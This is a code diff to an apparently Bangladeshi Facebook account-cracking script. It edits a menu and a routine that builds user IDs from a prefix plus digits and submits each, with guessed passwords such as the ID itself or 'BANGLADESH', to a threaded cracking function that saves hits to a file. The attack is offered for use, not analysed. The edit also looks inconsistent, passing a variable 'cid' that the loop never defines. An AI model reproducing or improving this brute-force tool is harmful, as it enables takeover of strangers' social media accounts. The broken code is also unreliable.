@@ -47,7 +47,7 @@ def NAYAN():
     if opt == '1':
         main()
     if opt == '2':
-        main()
+        main2()
     if opt == '3':
         os.system('xdg-open https://www.facebook.com/www.xnxx.com09')
         return None
@@ -275,14 +275,14 @@ def main2():
 	    for guru in user:
 		    uid = kode+guru
 		    pwx = [guru, 'BANGLADESH',]
-		    yaari.submit(rcrack,uid,pwx,tl)
+		    yaari.submit(rcrack,cid,pwx,tl)
     print('\nCRACK PROCESS HAS BEEN COMPLETED ')
     print('\nIDS SAVED IN Nayan_OK.txt')
     print(54*'─')
 
 agents=[]
 
-def rcrack(uid,pwx,tl):
+def rcrack(cid,pwx,tl):
 	#print(user)
 	global loop
 	global cps
